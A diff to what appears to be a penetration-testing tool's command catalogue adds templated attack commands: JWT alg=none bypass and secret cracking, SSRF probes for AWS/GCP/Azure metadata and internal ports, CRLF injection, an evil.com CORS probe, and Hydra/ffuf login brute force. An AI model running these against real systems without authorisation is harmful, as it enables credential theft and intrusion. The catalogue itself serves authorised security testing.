@@ -156,3 +156,155 @@ title = "gowitness — screenshot"
 template = "gowitness single -u http://{target}"
 requires = ["gowitness"]
 tags = ["screenshot"]
+
+# === JWT / tokens ===
+
+[[command]]
+id = "web.jwt_tool.scan"
+title = "jwt_tool — scan token"
+template = "jwt_tool 'TOKEN' -M at -t http://{target}"
+requires = ["jwt_tool"]
+tags = ["jwt"]
+
+[[command]]
+id = "web.jwt_tool.none"
+title = "jwt_tool — alg=none bypass"
+template = "jwt_tool 'TOKEN' -X a"
+requires = ["jwt_tool"]
+tags = ["jwt", "none"]
+
+[[command]]
+id = "web.jwt_tool.crack"
+title = "jwt_tool — crack secret"
+template = "jwt_tool 'TOKEN' -C -d /usr/share/wordlists/rockyou.txt"
+requires = ["jwt_tool"]
+tags = ["jwt", "crack"]
+
+# === SSRF probes ===
+
+[[command]]
+id = "web.ssrf.aws_metadata"
+title = "SSRF probe: AWS metadata"
+template = "curl -k -gG 'http://{target}/proxy?url=http://169.254.169.254/latest/meta-data/' --max-time 10"
+requires = ["curl"]
+tags = ["ssrf", "cloud"]
+
+[[command]]
+id = "web.ssrf.gcp_metadata"
+title = "SSRF probe: GCP metadata"
+template = "curl -k -gG 'http://{target}/proxy?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google' --max-time 10"
+requires = ["curl"]
+tags = ["ssrf", "cloud"]
+
+[[command]]
+id = "web.ssrf.azure_metadata"
+title = "SSRF probe: Azure IMDS"
+template = "curl -k -gG 'http://{target}/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true' --max-time 10"
+requires = ["curl"]
+tags = ["ssrf", "cloud"]
+
+[[command]]
+id = "web.ssrf.localhost"
+title = "SSRF probe: localhost ports"
+template = "for port in 22 80 443 3000 5000 5432 6379 8080 8443 9200 27017; do curl -ks --max-time 3 -o /dev/null -w 'port='$port' code=%{{http_code}} time=%{{time_total}}\\n' \"http://{target}/proxy?url=http://127.0.0.1:$port\"; done"
+requires = ["curl"]
+tags = ["ssrf", "internal"]
+
+# === CRLF / smuggling ===
+
+[[command]]
+id = "web.crlf.basic"
+title = "CRLF injection probe"
+template = "curl -k -i 'http://{target}/?next=%0d%0aSet-Cookie:%20chrono=injected'"
+requires = ["curl"]
+tags = ["crlf"]
+
+[[command]]
+id = "web.smuggling.simple"
+title = "smuggler.py — request smuggling check"
+template = "smuggler.py -u http://{target}"
+requires = ["smuggler.py"]
+tags = ["smuggling"]
+
+# === OSINT / passive recon ===
+
+[[command]]
+id = "web.subfinder"
+title = "subfinder — passive subdomains"
+template = "subfinder -d {hostname} -all -recursive"
+requires = ["subfinder"]
+tags = ["osint", "subdomain"]
+
+[[command]]
+id = "web.amass.passive"
+title = "amass — passive enum"
+template = "amass enum -passive -d {hostname}"
+requires = ["amass"]
+tags = ["osint", "subdomain"]
+
+[[command]]
+id = "web.waybackurls"
+title = "waybackurls — historical URLs"
+template = "echo {hostname} | waybackurls | tee wayback.txt | head -50"
+requires = ["waybackurls"]
+tags = ["osint", "history"]
+
+[[command]]
+id = "web.gau"
+title = "gau — all URLs from CommonCrawl/Wayback/OTX"
+template = "gau {hostname} | tee gau.txt | head -100"
+requires = ["gau"]
+tags = ["osint"]
+
+[[command]]
+id = "web.assetfinder"
+title = "assetfinder — subdomain discovery"
+template = "assetfinder --subs-only {hostname}"
+requires = ["assetfinder"]
+tags = ["osint", "subdomain"]
+
+[[command]]
+id = "web.dnsdumpster"
+title = "dnsdumpster (manual curl helper)"
+template = "curl -s 'https://dnsdumpster.com/' | grep -oE '[a-z0-9-]+\\.{hostname}' | sort -u"
+requires = ["curl"]
+tags = ["osint", "dns"]
+
+# === Tooling helpers ===
+
+[[command]]
+id = "web.burp.curl_paste"
+title = "curl + Burp upstream proxy (paste cookies)"
+template = "curl -k --proxy http://127.0.0.1:8080 -b 'sess=...' http://{target}/api/me"
+requires = ["curl"]
+tags = ["burp"]
+
+[[command]]
+id = "web.headers_security"
+title = "Inspect security headers"
+template = "curl -kI http://{target} | egrep -i 'strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy'"
+requires = ["curl"]
+tags = ["headers", "hardening"]
+
+[[command]]
+id = "web.cors.probe"
+title = "CORS — Origin echo probe"
+template = "curl -kI -H 'Origin: https://evil.com' http://{target}/api | egrep -i 'access-control'"
+requires = ["curl"]
+tags = ["cors"]
+
+# === Auth / login bruteforce ===
+
+[[command]]
+id = "web.hydra.http_form"
+title = "hydra — HTTP form login"
+template = "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+requires = ["hydra"]
+tags = ["bruteforce"]
+
+[[command]]
+id = "web.ffuf.login"
+title = "ffuf — login bruteforce (POST body)"
+template = "ffuf -u http://{target}/login -X POST -d 'user=admin&pass=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/rockyou.txt -fc 401,403"
+requires = ["ffuf"]
+tags = ["bruteforce"]
